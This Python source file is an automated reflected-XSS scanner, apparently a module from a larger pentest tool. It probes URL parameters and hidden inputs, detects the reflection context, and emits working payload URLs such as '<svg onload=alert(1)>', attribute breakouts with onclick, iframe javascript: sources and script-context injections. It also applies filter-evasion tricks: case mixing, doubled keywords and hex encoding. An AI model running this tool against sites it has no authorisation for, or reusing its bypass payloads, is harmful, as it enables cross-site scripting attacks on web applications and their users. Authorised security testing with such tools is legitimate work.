from xss.html_parser import MyHTMLParser
from lib.core.settings import XSS_TAG_MARKER
from lib.core.settings import XSS_MARKER
from xss.setting import LIGHT_MODEL
from xss.setting import HEAVY_MODEL
from xss.temper.hex_10 import Hex_10
from xss.temper.hex_16 import Hex_16
from xss.temper.uppercase import UpperCase
from xss.temper.addkeywords import AddKeywords
from urllib import parse
import re


class CheckXss:
    def __init__(self, urls ,log):
        self.log = log
        self.urls = urls
        self.url = self.urls.url
        self.params = self.urls.params
        self.params_num = self.urls.params_num

    def check_normal_data(self, xss_type, xss_text, param):
        '''
            普通标签之间类型判断
        '''
        new_url = self.urls.url_replacer(param["key"], param["value"], XSS_TAG_MARKER)
        keyword = xss_text.replace(XSS_MARKER, XSS_TAG_MARKER)
        if self.urls.check_keyword(new_url, keyword):
            # 说明可以使用尖括号闭合任意标签
            payload = "<svg onload=alert(1)>"
            # 大小写绕过
            payload = UpperCase().temper(payload, LIGHT_MODEL)
            payload = parse.quote(payload)
            return self.urls.url_replacer(param["key"], param["value"], payload)
        return False

    def check_normal_attr_value(self, xss_type, xss_text, param):
        '''
            检测普通标签属性
        '''
        # 检测逃逸类型
        flag = re.findall(XSS_MARKER + "(.)", xss_text)[0]
        # 检测是否可以逃逸
        new_url = self.urls.url_replacer(param["key"], param["value"], XSS_MARKER + flag)
        result1 = self.urls.check_keyword(new_url, XSS_MARKER + flag*2)
        if result1: 
            # 逃逸后检测是否可以用on属性
            payload = XSS_MARKER + flag + "onclick="+flag+"alert(1)"
            # 先大小写绕过试试
            upper_poyload = UpperCase().temper(payload, LIGHT_MODEL)
            new_url2 = self.urls.url_replacer(param["key"], param["value"], upper_poyload)
            if self.urls.check_keyword(new_url2, upper_poyload):
                payload = upper_poyload
            # 双写绕过的情况
            elif self.urls.check_keyword(new_url2, payload.replace("onclick", "")):
                payload = AddKeywords().temper(payload)
            # 改用href属性或src属性的十六进制编码绕过
            else:
                payload = XSS_MARKER + flag + "><iframe src="+ flag +"javascript:alert(1)"
                payload = Hex_16().temper(payload).pop()
            payload = parse.quote(payload)
            return self.urls.url_replacer(param["key"], param["value"], payload)
        else:
            return False

    def check_script_data(self, xss_type, xss_text, param):
        '''
            检测script标签之间
        '''
        # 检测逃逸类型
        flag = re.findall(XSS_MARKER + "(.)", xss_text)[0]
        # 检测是否可以逃逸
        new_url = self.urls.url_replacer(param["key"], param["value"], XSS_MARKER + flag)
        keyword = xss_text.replace(XSS_MARKER, XSS_MARKER + flag)
        if self.urls.check_keyword(new_url, keyword):
            payload = XSS_MARKER + flag + ";alert(1)//"
            payload = parse.quote(payload)
            return self.urls.url_replacer(param["key"], param["value"], payload)
        return False

    def check_xss(self, xss_type, xss_text, param):
        '''
            检查双引号逃逸,单引号逃逸,尖括号闭合
            returns: payload or False
        '''
        # 普通标签之间
        if xss_type == "normal_data":
            return self.check_normal_data(xss_type, xss_text, param)
        # 标签内普通属性
        elif xss_type == "normal_attr_value":
            return self.check_normal_attr_value(xss_type, xss_text, param)
        # href,data,src属性内
        elif xss_type == "xss_attr_value":
            payload = "javascript:alert(1)"
            # 16进制hex
            payload = Hex_16().temper(payload).pop()
            # url编码
            payload = parse.quote(payload)
            return self.urls.url_replacer(param["key"], param["value"], payload)
        # script标签之间
        elif xss_type == "script_data":
            return self.check_script_data(xss_type, xss_text, param)
        # script标签之间注释符内
        elif xss_type == "exp_script_data":
            payload = r"%0aalert(1);//"
            return self.urls.url_replacer(param["key"], param["value"], payload)
        else:
            return False

    def check_xss_type(self, param):
        '''
            检查可能存在xss的类型
            returns: []
        '''
        parser = MyHTMLParser()
        url = self.urls.url_replacer(param["key"], param["value"], XSS_MARKER)
        r = self.urls.http_request(url)
        parser.feed(r.text)
        return parser.xss_list

    def check_hidden(self):
        '''
            检测是否有hiiden属性
        '''
        keywords = [
            '<input.*name="(.*?)".*type="hidden".*>',
            '<input.*type="hidden".*name="(.*?)".*>'
        ]
        for keyword in keywords:
            result = self.urls.check_keyword(self.urls.url, keyword, False)
            if result:
                for param in result:
                    payload = parse.quote('"><img sRc=1 onERRor="alert(1)')
                    url = self.urls.url + "&"+ param + '=' + payload
                    if self.urls.check_keyword(url, '(<img sRc=1 onERRor="alert.*>)', False):
                        return url
        return False
        


    def detected(self):
        self.log.info("正在检测url:%s" %self.urls.url)
        # 检测是否有hidden属性的隐藏参数
        result = self.check_hidden()
        if result:
            return result 
        # 对每个参数进行遍历
        for param_id in range(self.params_num):
            self.log.info("检测xss第%s个参数" % (param_id+1))
            param = self.params[param_id]
            xss_type_list = self.check_xss_type(param)
            if xss_type_list:
                for xss in xss_type_list:
                    # 对可能存在xss的每种类型进行检测
                    payload = self.check_xss(xss["type"], xss["text"], param)
                    if payload:
                        return payload
        return False